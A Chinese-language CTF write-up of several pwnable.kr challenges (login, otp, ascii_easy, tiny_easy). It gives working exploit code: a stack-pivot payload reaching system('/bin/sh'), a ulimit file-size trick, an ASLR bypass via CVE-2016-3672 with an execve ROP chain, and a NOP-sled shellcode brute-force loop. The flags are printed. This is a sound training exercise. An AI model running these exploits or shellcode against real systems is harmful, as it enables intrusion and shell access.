注意到`input`变量是直接写在`.bss`段上的。可以看到`input` 中的字符串被复制到 `v4` ，其中 `input` 的长度最大可以达到 `12`，而 `v4` 的长度仅仅为 `8`，溢出的 `4` 个字节将会覆盖函数 `auth()` 的栈帧中保存的 `$ebp`寄存器。也就是说，我们可以通过这个栈溢出漏洞控制 `main()` 函数的 `$ebp` 寄存器的值。

继续审计代码，双击`correct()`函数查看详情：

```c
void __noreturn correct()
{
  if ( input == -559038737 )
  {
    puts("Congratulation! you are good!");
    system("/bin/sh");
  }
  exit(0);
}
```

`correct()`函数中发现宝藏`system("/bin/sh");`，如果能控制`$eip` 寄存器执行该语句就能成功拿到`flag`。用`gdb`来查看汇编代码更美观直接。我们首先通过栈溢出漏洞控制函数`auth`的栈帧中保存的`$ebp` ，接着在其返回处通过`leave`（等价于`mov esp, ebp; pop ebp`）控制`main`函数中`$ebp`寄存器的值，然后在`main`函数返回处通过`leave`控制`$esp`的值，进而通过`ret`（等价于`pop eip`）控制`$eip`寄存器，最终劫持程序跳转执行`system("/bin/sh");`。此外需要注意`mov esp, ebp; pop ebp`时，`$esp`寄存器的值会减`4`，所以构造`payload`时需要用`padding`填充前`4`个字节。

```assembly
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ gdb ./login
pwndbg> disassemble main
Dump of assembler code for function main:
   0x0804930d <+0>:     push   ebp
   0x0804930e <+1>:     mov    ebp,esp
   0x08049310 <+3>:     and    esp,0xfffffff0
   0x08049313 <+6>:     sub    esp,0x40
   0x08049316 <+9>:     mov    DWORD PTR [esp+0x8],0x1e
   0x0804931e <+17>:    mov    DWORD PTR [esp+0x4],0x0
   0x08049326 <+25>:    lea    eax,[esp+0x1e]
   0x0804932a <+29>:    mov    DWORD PTR [esp],eax
   0x0804932d <+32>:    call   0x80482e0
   0x08049332 <+37>:    mov    eax,ds:0x811b860
   0x08049337 <+42>:    mov    DWORD PTR [esp+0xc],0x0
   0x0804933f <+50>:    mov    DWORD PTR [esp+0x8],0x2
   0x08049347 <+58>:    mov    DWORD PTR [esp+0x4],0x0
   0x0804934f <+66>:    mov    DWORD PTR [esp],eax
   0x08049352 <+69>:    call   0x805c680 <setvbuf>
   0x08049357 <+74>:    mov    eax,ds:0x811b864
   0x0804935c <+79>:    mov    DWORD PTR [esp+0xc],0x0
   0x08049364 <+87>:    mov    DWORD PTR [esp+0x8],0x1
   0x0804936c <+95>:    mov    DWORD PTR [esp+0x4],0x0
   0x08049374 <+103>:   mov    DWORD PTR [esp],eax
   0x08049377 <+106>:   call   0x805c680 <setvbuf>
   0x0804937c <+111>:   mov    DWORD PTR [esp],0x80da6a5
   0x08049383 <+118>:   call   0x805b630 <printf>
   0x08049388 <+123>:   lea    eax,[esp+0x1e]
   0x0804938c <+127>:   mov    DWORD PTR [esp+0x4],eax
   0x08049390 <+131>:   mov    DWORD PTR [esp],0x80da6b5
   0x08049397 <+138>:   call   0x805b690 <__isoc99_scanf>
   0x0804939c <+143>:   mov    DWORD PTR [esp+0x8],0xc
   0x080493a4 <+151>:   mov    DWORD PTR [esp+0x4],0x0
   0x080493ac <+159>:   mov    DWORD PTR [esp],0x811eb40
   0x080493b3 <+166>:   call   0x80482e0
   0x080493b8 <+171>:   mov    DWORD PTR [esp+0x18],0x0
   0x080493c0 <+179>:   lea    eax,[esp+0x18]
   0x080493c4 <+183>:   mov    DWORD PTR [esp+0x4],eax
   0x080493c8 <+187>:   lea    eax,[esp+0x1e]
   0x080493cc <+191>:   mov    DWORD PTR [esp],eax
   0x080493cf <+194>:   call   0x8049095 <Base64Decode>
   0x080493d4 <+199>:   mov    DWORD PTR [esp+0x3c],eax
   0x080493d8 <+203>:   cmp    DWORD PTR [esp+0x3c],0xc
   0x080493dd <+208>:   ja     0x8049413 <main+262>
   0x080493df <+210>:   mov    eax,DWORD PTR [esp+0x18]
   0x080493e3 <+214>:   mov    edx,DWORD PTR [esp+0x3c]
   0x080493e7 <+218>:   mov    DWORD PTR [esp+0x8],edx
   0x080493eb <+222>:   mov    DWORD PTR [esp+0x4],eax
   0x080493ef <+226>:   mov    DWORD PTR [esp],0x811eb40
   0x080493f6 <+233>:   call   0x8069660 <memcpy>
   0x080493fb <+238>:   mov    eax,DWORD PTR [esp+0x3c]
   0x080493ff <+242>:   mov    DWORD PTR [esp],eax
   0x08049402 <+245>:   call   0x804929c <auth>
   0x08049407 <+250>:   cmp    eax,0x1
   0x0804940a <+253>:   jne    0x804941f <main+274>
   0x0804940c <+255>:   call   0x804925f <correct>
   0x08049411 <+260>:   jmp    0x804941f <main+274>
   0x08049413 <+262>:   mov    DWORD PTR [esp],0x80da6ba
   0x0804941a <+269>:   call   0x805c2d0 <puts>
   0x0804941f <+274>:   mov    eax,0x0
   0x08049424 <+279>:   leave  # 等价 mov esp, ebp; pop ebp; (esp = esp+4)
   0x08049425 <+280>:   ret    # 等价 pop eip
End of assembler dump.
pwndbg> disassemble auth
Dump of assembler code for function auth:
   0x0804929c <+0>:     push   ebp
   0x0804929d <+1>:     mov    ebp,esp
   0x0804929f <+3>:     sub    esp,0x28
   0x080492a2 <+6>:     mov    eax,DWORD PTR [ebp+0x8]
   0x080492a5 <+9>:     mov    DWORD PTR [esp+0x8],eax
   0x080492a9 <+13>:    mov    DWORD PTR [esp+0x4],0x811eb40
   0x080492b1 <+21>:    lea    eax,[ebp-0x14]
   0x080492b4 <+24>:    add    eax,0xc
   0x080492b7 <+27>:    mov    DWORD PTR [esp],eax
   0x080492ba <+30>:    call   0x8069660 <memcpy>
   0x080492bf <+35>:    mov    DWORD PTR [esp+0x4],0xc
   0x080492c7 <+43>:    lea    eax,[ebp-0x14]
   0x080492ca <+46>:    mov    DWORD PTR [esp],eax
   0x080492cd <+49>:    call   0x8049188 <calc_md5>
   0x080492d2 <+54>:    mov    DWORD PTR [ebp-0xc],eax
   0x080492d5 <+57>:    mov    eax,DWORD PTR [ebp-0xc]
   0x080492d8 <+60>:    mov    DWORD PTR [esp+0x4],eax
   0x080492dc <+64>:    mov    DWORD PTR [esp],0x80da677
   0x080492e3 <+71>:    call   0x805b630 <printf>
   0x080492e8 <+76>:    mov    eax,DWORD PTR [ebp-0xc]
   0x080492eb <+79>:    mov    DWORD PTR [esp+0x4],eax
   0x080492ef <+83>:    mov    DWORD PTR [esp],0x80da684
   0x080492f6 <+90>:    call   0x80482f0
   0x080492fb <+95>:    test   eax,eax
   0x080492fd <+97>:    jne    0x8049306 <auth+106>
   0x080492ff <+99>:    mov    eax,0x1
   0x08049304 <+104>:   jmp    0x804930b <auth+111>
   0x08049306 <+106>:   mov    eax,0x0
   0x0804930b <+111>:   leave  # 等价 mov esp, ebp; pop ebp; (esp = esp+4)
   0x0804930c <+112>:   ret    # 等价 pop eip    
End of assembler dump.
pwndbg> disassemble correct
Dump of assembler code for function correct:
   0x0804925f <+0>:     push   ebp
   0x08049260 <+1>:     mov    ebp,esp
   0x08049262 <+3>:     sub    esp,0x28
   0x08049265 <+6>:     mov    DWORD PTR [ebp-0xc],0x811eb40
   0x0804926c <+13>:    mov    eax,DWORD PTR [ebp-0xc]
   0x0804926f <+16>:    mov    eax,DWORD PTR [eax]
   0x08049271 <+18>:    cmp    eax,0xdeadbeef
   0x08049276 <+23>:    jne    0x8049290 <correct+49>
   0x08049278 <+25>:    mov    DWORD PTR [esp],0x80da651   # 
   0x0804927f <+32>:    call   0x805c2d0 <puts>
   0x08049284 <+37>:    mov    DWORD PTR [esp],0x80da66f   # "/bin/sh" 被加载到栈上$esp寄存器指向的位置
   0x0804928b <+44>:    call   0x805b2b0 <system>          # 系统调用system函数
   0x08049290 <+49>:    mov    DWORD PTR [esp],0x0
   0x08049297 <+56>:    call   0x805a6a0 <exit>
End of assembler dump.
```

编写`Python`代码求解得到`flag`：`control EBP, control ESP, control EIP, control the world~`。

```python
from pwn import *

io = remote('pwnable.kr', 9003)
elf = ELF('./login')
input_addr = elf.sym["input"]  # 0x811eb40
shell_addr = elf.sym["correct"] + 37  # 0x8049284
payload = cyclic(4) + p32(shell_addr) + p32(input_addr)
payload = b64e(payload)  # 'YWFhYYSSBAhA6xEI'
log.success('Authenticate: %s' % payload)
io.sendlineafter("Authenticate : ", payload)
io.interactive()
```

此外还可以先计算出`Authenticate`：

```bash
>>> little_hex_address = lambda addr: ''.join(format(byte, '02x') for byte in addr.to_bytes(4, 'little'))
>>> little_hex_address(0x8049278)
78920408
>>> little_hex_address(0x811eb40)  # obj.input
40eb1108
>>> import base64
>>> base64.b64encode(bytes.fromhex('00000000 78920408 40eb1108'))
b'AAAAAHiSBAhA6xEI'
```

`nc`进去也能打通。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ nc pwnable.kr 9003
Authenticate : AAAAAHiSBAhA6xEI
hash : 820da7b196c274c4fe466911c29867cc
Congratulation! you are good!
cat flag
control EBP, control ESP, control EIP, control the world~
```

------

### otp

这是**Pwnable.kr**的第二十五个挑战`otp`，来自**[Rookiss]**部分。

```bash
I made a skeleton interface for one time password authentication system.
I guess there are no mistakes.
could you take a look at it?

hint : not a race condition. do not bruteforce.

ssh otp@pwnable.kr -p2222 (pw:guest)
```

首先通过`ssh`远程连接目标主机。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ ssh otp@pwnable.kr -p2222
otp@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@khu.ac.kr
- irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have mail.
Last login: Fri Jun 23 04:52:25 2023 from 121.18.90.141
```

然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。

```bash
otp@pwnable:~$ ls -la
total 40
drwxr-x---   5 root    otp  4096 Oct 23  2016 .
drwxr-xr-x 117 root    root 4096 Nov 10  2022 ..
d---------   2 root    root 4096 Jun 14  2014 .bash_history
-r--r-----   1 otp_pwn root   65 Jun 14  2014 flag
dr-xr-xr-x   2 root    root 4096 Aug 20  2014 .irssi
-r-sr-x---   1 otp_pwn otp  9052 Jun 14  2014 otp
-rw-r--r--   1 root    root  820 Jun 14  2014 otp.c
drwxr-xr-x   2 root    root 4096 Oct 23  2016 .pwntools-cache
```

输入`cat otp.c`来查看`otp.c`的代码。程序会接收一个命令行参数`passcode`，接着从`/dev/urandow`伪随机设备里读取`16`个字节（`128`位）随机数据到数组`otp`中，前`8`个字节用作文件名，后`8`字节存写入该文件中，随后输出`"OTP generated."`。程序会使用`strtoul()`将`passcode`转换成`unsigned long long`型，并与生成的密码进行比较，如果相等就能执行`system("/bin/cat flag");`，否则输出`"OTP mismatch"`。简而言之，该程序会生成一个随机的`OTP`，将其存储在一个文件中，随后读取它并将其与用户提供的密码进行比较，如果密码匹配则执行`/bin/cat flag`命令显示`flag`中的内容。

```c
otp@pwnable:~$ cat otp.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

int main(int argc, char* argv[]){
    char fname[128];
    unsigned long long otp[2];

    if(argc!=2){
        printf("usage : ./otp [passcode]\n");
        return 0;
    }

    int fd = open("/dev/urandom", O_RDONLY);
    if(fd==-1) exit(-1);

    if(read(fd, otp, 16)!=16) exit(-1);
    close(fd);

    sprintf(fname, "/tmp/%llu", otp[0]);
    FILE* fp = fopen(fname, "w");
    if(fp==NULL){ exit(-1); }
    fwrite(&otp[1], 8, 1, fp);
    fclose(fp);

    printf("OTP generated.\n");

    unsigned long long passcode=0;
    FILE* fp2 = fopen(fname, "r");
    if(fp2==NULL){ exit(-1); }
    fread(&passcode, 8, 1, fp2);
    fclose(fp2);

    if(strtoul(argv[1], 0, 16) == passcode){
        printf("Congratz!\n");
        system("/bin/cat flag");
    }
    else{
        printf("OTP mismatch\n");
    }

    unlink(fname);
    return 0;
}
```

使用`ulimit -f 0`来限制进程创建文件的大小为`0`，这样程序就无法将缓冲区中的内容就写入文件，那么最后读出来的自然也是`0`。

```bash
otp@pwnable:~$ ulimit -f 0
# 直接这样不行
otp@pwnable:~$ ./otp 0
File size limit exceeded (core dumped)
# 利用Python的os模块在进程中执行./otp 0可以
otp@pwnable:~$ python -c "import os; os.system('./otp 0')"
OTP generated.
Congratz!
Darn... I always forget to check the return value of fclose() :(
# 利用subprocess模块在子进程中执行./otp 0也可以
otp@pwnable:~$ python -c "import subprocess; proc = subprocess.Popen(['/home/otp/otp', '']); proc.wait()"
# 通过将信号处理程序设置为忽略SIGXFSZ信号，该命令确保忽略./otp程序遇到的任何文件大小超过限制的错误(SIGXFSZ)，并且不会导致命令终止。
otp@pwnable:~$ python -c "import os, signal; signal.signal(signal.SIGXFSZ, signal.SIG_IGN); os.system('./otp 0')"
```

提交`Darn... I always forget to check the return value of fclose() :(`即可。

------

### ascii_easy

这是**Pwnable.kr**的第二十六个挑战`ascii_easy`，来自**[Rookiss]**部分。

```bash
We often need to make 'printable-ascii-only' exploit payload.  You wanna try?

hint : you don't necessarily have to jump at the beggining of a function. try to land anyware.


ssh ascii_easy@pwnable.kr -p2222 (pw:guest)
```

首先通过`ssh`远程连接目标主机。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ ssh ascii_easy@pwnable.kr -p2222
ascii_easy@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@khu.ac.kr
- irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have new mail.
Last login: Thu Jun 22 16:14:20 2023 from 88.217.36.18
```

然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。

```bash
ascii_easy@pwnable:~$ ls -la
total 1720
drwxr-x---   5 root ascii_easy        4096 Nov  3  2017 .
drwxr-xr-x 117 root root              4096 Nov 10  2022 ..
-r-xr-sr-x   1 root ascii_easy_pwn    7624 Nov  3  2017 ascii_easy
-rw-r--r--   1 root root              1041 Nov  3  2017 ascii_easy.c
d---------   2 root root              4096 Aug  6  2014 .bash_history
-r--r-----   1 root ascii_easy_pwn      52 Aug  6  2014 flag
-r--r-----   1 root ascii_easy_pwn     141 Oct 27  2016 intended_solution.txt
dr-xr-xr-x   2 root root              4096 Aug 20  2014 .irssi
-rwxr--r--   1 root root           1717736 Oct 27  2016 libc-2.15.so
drwxr-xr-x   2 root root              4096 Oct 23  2016 .pwntools-cache
```

用`checksec`查看二进制文件`ascii_easy`，可以看到`NX enabled`，这意味着堆栈中数据不可执行。

```bash
ascii_easy@pwnable:~$ checksec --file='./ascii_easy'
[*] '/home/ascii_easy/ascii_easy'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

输入`cat ascii_easy.c`来查看`ascii_easy.c`的代码。

```c
ascii_easy@pwnable:~$ cat ascii_easy.c
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>

#define BASE ((void*)0x5555e000)

int is_ascii(int c){
    if(c>=0x20 && c<=0x7f) return 1;
    return 0;
}

void vuln(char* p){
    char buf[20];
    strcpy(buf, p);
}

void main(int argc, char* argv[]){

    if(argc!=2){
        printf("usage: ascii_easy [ascii input]\n");
        return;
    }

    size_t len_file;
    struct stat st;
    int fd = open("/home/ascii_easy/libc-2.15.so", O_RDONLY);
    if( fstat(fd,&st) < 0){
        printf("open error. tell admin!\n");
        return;
    }

    len_file = st.st_size;
    if (mmap(BASE, len_file, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE, fd, 0) != BASE){
        printf("mmap error!. tell admin\n");
        return;
    }

    int i;
    for(i=0; i<strlen(argv[1]); i++){
        if( !is_ascii(argv[1][i]) ){
            printf("you have non-ascii byte!\n");
            return;
        }
    }

    printf("triggering bug...\n");
    vuln(argv[1]);

}
```

`mmap`映射的内存被设置为可执行，因此我们可以使用。`mmap()`的函数声明如下：

```c
void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
```

如果映射成功，该`mmap`函数将返回指向映射内存区域的指针。如果发生错误，则返回`MAP_FAILED`（通常定义为`(void *) -1`）。

- `void *addr`：该参数指定映射内存区域所需的起始地址。如果`addr`是`NULL`，操作系统会自动选择地址，这里可以产生随机化。
- `size_t length`：该`length`参数指定要映射的内存区域的长度（以字节为单位）。
- `int prot`：该`prot`参数决定映射区域的内存保护。它可以是以下标志的组合：
  - `PROT_READ`：可以读取页面。
  - `PROT_WRITE`：可以写入页面。
  - `PROT_EXEC`：可以执行页面。
  - `PROT_NONE`: 页面可能无法访问。
- `int flags`：该`flags`参数提供附加标志来控制内存映射的行为。一些常用的标志包括：
  - `MAP_SHARED`：与其他进程共享此映射。
  - `MAP_PRIVATE`：创建私有的写时复制映射。
  - `MAP_FIXED`：将映射放置在 指定的确切地址处`addr`。
  - `MAP_ANONYMOUS`：映射不与任何文件关联的内存。
- `int fd`：`fd`参数为要映射的文件的文件描述符。它应该是通过打开文件或设备获得的有效文件描述符。
- `off_t offset`：该`offset`参数指定文件内映射应开始的偏移量。通常设置为 0 以从文件开头开始映射。

由于系统的`ASLR`随机化地址空间布局，每次`mmap`得到的地址均是不同的。`ASLR`是操作系统使用的一种安全技术，它的主要目标是通过对堆、栈、共享库映射等线性区内存布局的随机化，使攻击者难以预测重要系统组件（例如可执行代码、库和数据）的内存地址，从而增强系统的安全性，抵御各种类型的攻击，特别是与内存相关的漏洞。

根据Linux ASLR漏洞**CVE-2016-3672**，当通过`ulimit -s unlimited`将栈大小设置为无限制后，在i386系统（或X86_64系统使用legacy模式模拟X86_32时）32位程序的`mmap`不会随机化，系统的`ALSR`将会失效，`ASLR`只会将栈随机化，而`mmap`得到的地址是固定的。

阅读`Linux`系统内核源码`arch/x86/mm/mmap.c`，可以找到以下方法：

```c
/* * This function, called very early during the creation of a new * process VM image, sets up which VM layout function to use: */
void arch_pick_mmap_layout(struct mm_struct *mm)
{
    mm->mmap_legacy_base = mmap_legacy_base();
    mm->mmap_base = mmap_base();
 
    if (mmap_is_legacy()) {
        mm->mmap_base = mm->mmap_legacy_base;
        mm->get_unmapped_area = arch_get_unmapped_area;
        mm->unmap_area = arch_unmap_area;
    } else {
        mm->get_unmapped_area = arch_get_unmapped_area_topdown;
        mm->unmap_area = arch_unmap_area_topdown;
    }   
}
```

可以看到，如果`mmap_is_legacy()`返回为真，`mmap_legacy_base()`函数用来计算当栈大小设置为无限制时的库文件位置，此时`mmap`的基址就是旧的`mmap_legacy_base`。`mmap_legacy_base()`函数的代码实现如下：

```c
/* * Bottom-up (legacy) layout on X86_32 did not support randomization, X86_64 * does, but not when emulating X86_32 */
static unsigned long mmap_legacy_base(void)
{   
    if (mmap_is_ia32())
        return TASK_UNMAPPED_BASE;
    else
        return TASK_UNMAPPED_BASE + mmap_rnd();
}
```

我们通过注释也可以看出，如果是32位程序，那么在i386系统和32位模拟系统X86_32中，`mmap_legacy_base`是一个固定值，不会加上随机的偏移量`mmap_rnd()`。顺便一提，这个漏洞在后续版本`5.10.13`中已经修复啦：

```c
static unsigned long mmap_legacy_base(unsigned long rnd, unsigned long task_size)
{
	return __TASK_UNMAPPED_BASE(task_size) + rnd;
}
```

综上所述，我们只需要设法让`mmap_is_legacy()`的返回值为真，就可以让`mmap`不进行随机化。`mmap_is_legacy()`函数的定义如下：

```c
static int mmap_is_legacy(void)
{
    if (current->personality & ADDR_COMPAT_LAYOUT)
        return 1;
    if (rlimit(RLIMIT_STACK) == RLIM_INFINITY)  // 检查栈大小 栈大小的值可以通过ulimit命令设置
        return 1;
    return sysctl_legacy_va_layout;
}
```

只要通过`ulimit -s unlimited`将栈大小设置为`unlimited`，那么就会导致系统的`ASLR`失效，随后运行`32`位程序时得到的`mmap`都会是固定的地址值。编写`Python`代码构造`payload`可以得到`flag`：``damn you ascii armor... what a pain in the ass!! :(`。

```python
from pwn import *

shell = ssh(user='ascii_easy', host='pwnable.kr', port=2222, password='guest')
shell.set_working_directory(symlink=True)
# shell.run('ulimit -s unlimited')
# shell.download('./ascii_easy')
shell_cmd = lambda cmd: shell.run(cmd).recvall().decode()
# shell_cmd('ls')
# shell.download('./libc-2.15.so')
libc = ELF("./libc-2.15.so")
libc.address = 0x5555e000

CALL_EXECVE = 0x5561676a
NULL_ADDR = 0x55564a3a
PATH_ADDR = 0x556c2b59

PATH = libc.string(PATH_ADDR).decode()
shell(f'mkdir -p "{os.path.dirname(PATH)}"')
shell(f'ln -s /bin/sh "{PATH}"')

payload = cyclic(0x20)
payload += p32(CALL_EXECVE)
payload += p32(PATH_ADDR)  # filename
payload += p32(NULL_ADDR)  # argv = {NULL}
payload += p32(NULL_ADDR)  # envp = {NULL}

io = shell.process(['ascii_easy', payload])
io.recvuntil(b"$ ")
io.sendline(b"cat flag")
log.success(f"flag = '{term.text.bold_italic_yellow(io.recvline().decode().strip())}'")
```

------

### tiny_easy

这是**Pwnable.kr**的第二十七个挑战`tiny_easy`，来自**[Rookiss]**部分。

```bash
I made a pretty difficult pwn task.
However I also made a dumb rookie mistake and made it too easy :(
This is based on real event :) enjoy.

ssh tiny_easy@pwnable.kr -p2222 (pw:guest)
```

首先通过`ssh`远程连接目标主机。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ ssh tiny_easy@pwnable.kr -p2222                
tiny_easy@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@khu.ac.kr
- irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have mail.
Last login: Fri Jun 23 11:14:20 2023 from 121.173.24.133
```

然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。

```bash
tiny_easy@pwnable:~$ ls -la
total 28
drwxr-x---   5 root tiny_easy     4096 Oct 23  2016 .
drwxr-xr-x 117 root root          4096 Nov 10  2022 ..
d---------   2 root root          4096 Jun 24  2014 .bash_history
-r--r-----   1 root tiny_easy_pwn   30 Jun 24  2014 flag
dr-xr-xr-x   2 root root          4096 Aug 20  2014 .irssi
drwxr-xr-x   2 root root          4096 Oct 23  2016 .pwntools-cache
-r-xr-sr-x   1 root tiny_easy_pwn   90 Jun 24  2014 tiny_easy
```

用户`tiny_easy`有权限访问的只有俩个文件：`flag`和`tiny_easy`。查看二进制文件`tiny_easy`信息。

```bash
tiny_easy@pwnable:~$ file ./tiny_easy
./tiny_easy: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, corrupted section header size
tiny_easy@pwnable:~$ checksec ./tiny_easy
[*] '/home/tiny_easy/tiny_easy'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
```

下载二进制文件`tiny_easy`并用`IDA Pro 32bit`打开，可以看到以下内容：

```assembly
LOAD:08048054                 public start
LOAD:08048054 start           proc near               ; DATA XREF: LOAD:08048018↑o
LOAD:08048054                 pop     eax
LOAD:08048055                 pop     edx
LOAD:08048056                 mov     edx, [edx]
LOAD:08048058                 call    edx
LOAD:08048058 start           endp ; sp-analysis failed
LOAD:08048058
LOAD:08048058 LOAD            ends
LOAD:08048058
LOAD:08048058
LOAD:08048058                 end start
```

用`gdb`对程序进一步分析。

```bash
tiny_easy@pwnable:~$ gdb ./tiny_easy
(gdb) b *0x8048056
Breakpoint 1 at 0x8048056
(gdb) r
Starting program: /home/tiny_easy/tiny_easy 

Breakpoint 1, 0x08048056 in ?? ()
(gdb) info r
eax            0x1      1
ecx            0x0      0
edx            0xfff6adb4       -610892
ebx            0x0      0
esp            0xfff6a408       0xfff6a408
ebp            0x0      0x0
esi            0x0      0
edi            0x0      0
eip            0x8048056        0x8048056
eflags         0x202    [ IF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x0      0
(gdb) x/7s $edx
0xfff6adb4:     "/home/tiny_easy/tiny_easy"
0xfff6adce:     "XDG_SESSION_ID=68337"
0xfff6ade3:     "SHELL=/bin/bash"
0xfff6adf3:     "TERM=xterm-256color"
0xfff6ae07:     "SSH_CLIENT=121.18.90.141 54541 2222"
0xfff6ae2b:     "SSH_TTY=/dev/pts/39"
0xfff6ae3f:     "USER=tiny_easy"
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x6d6f682f in ?? ()
```

程序将`/hom`移动到`$edx`，然后`call edx`让程序跳转到地址`0x6d6f682f`(/hom)，结果触发了段错误。先制造一个`shellcode`。

```bash
from pwn import *

shell = ssh(user='tiny_easy', host='pwnable.kr', port=2222, password='guest')
# shell.download('./tiny_easy')
shellcode = asm(shellcraft.i386.linux.sh())
# b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
```

继续用`gdb`分析程序

```bash
tiny_easy@pwnable:~$ export A=$(python -c 'print("jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80")')
tiny_easy@pwnable:~$ gdb ./tiny_easy
(gdb) b *0x8048058
Breakpoint 1 at 0x8048058
(gdb) r
Starting program: /home/tiny_easy/tiny_easy 

Breakpoint 1, 0x08048058 in ?? ()
(gdb) info r
eax            0x1      1
ecx            0x0      0
edx            0x6d6f682f       1836017711
ebx            0x0      0
esp            0xffb36d08       0xffb36d08
ebp            0x0      0x0
esi            0x0      0
edi            0x0      0
eip            0x8048058        0x8048058
eflags         0x202    [ IF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x0      0
(gdb) x/8xw 0xffb36d08
0xffb36d08:     0x00000000      0xffb37da0      0xffb37dcf      0xffb37de4
0xffb36d18:     0xffb37df4      0xffb37e08      0xffb37e2c      0xffb37e3f
(gdb) x/16s 0xffb37da0
0xffb37da0:     "A=jhh///sh/bin\211\343h\001\001\001\001\201\064$ri\001\001\061\311Qj\004Y\001\341Q\211\341\061\322j\vX"
0xffb37dcf:     "XDG_SESSION_ID=68460"
0xffb37de4:     "SHELL=/bin/bash"
0xffb37df4:     "TERM=xterm-256color"
0xffb37e08:     "SSH_CLIENT=121.18.90.141 55582 2222"
0xffb37e2c:     "SSH_TTY=/dev/pts/3"
0xffb37e3f:     "USER=tiny_easy"
0xffb37e4e:     "COLUMNS=102"
0xffb37e5a:     "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin"
0xffb37ec2:     "MAIL=/var/mail/tiny_easy"
0xffb37edb:     "_=/usr/bin/gdb"
0xffb37eea:     "PWD=/home/tiny_easy"
0xffb37efe:     "LANG=en_US.UTF-8"
0xffb37f0f:     "LINES=29"
0xffb37f18:     "HOME=/home/tiny_easy"
0xffb37f2d:     "SHLVL=1"
```

猜想一个`argv[0]`的地址，比如`0xffb37da0`。在进行暴力破解之前，我们应该先用nop(`\x90`)填充shellcode，以提高暴力破解的成功率`call edx`。爆破成功后会出现`$`，在`shell`输入`cat flag`得到`What a tiny task :) good job!`

```bash
tiny_easy@pwnable:~$ export A=$(python -c 'print("\x90" * 30000 + "jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80")'); for i in {1..1000}; do bash -c "exec -a $(python -c 'print("\xa0\x7d\xb3\xff")') ./tiny_easy"; done
Segmentation fault (core dumped)
Segmentation fault (core dumped)
... ...
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
$ cat flag
